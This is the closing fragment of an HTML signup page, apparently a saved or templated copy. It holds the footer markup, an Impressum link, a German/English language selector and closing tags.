                    </span>
                  </a>
                </li>
                <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_impressum_item">
                  <a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_corporate_information_impressum">
                    <span id="" data-uia="data-uia-footer-label">Impressum
                    </span>
                  </a>
                </li>
              </ul>
              <div class="lang-selection-container" id="lang-switcher">
                <div class="nfSelectWrapper inFooter selectArrow prefix" data-uia="language-picker+container">
                  <div class="nfSelectPlacement globe">
                    <select data-uia="language-picker" class="nfSelect" name="__langSelect" tabindex="0">
                      <option value="/signup/regform?locale=de-DE" label="Deutsch">Deutsch
                      </option>
                      <option selected="" value="/signup/regform?locale=en-DE" label="English">English
                      </option>
                    </select>
                    <label class="nfLabel no-display placeLabel">
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1">
          </div>
        </div>
      </div>
    </div>
    </body>
</html>
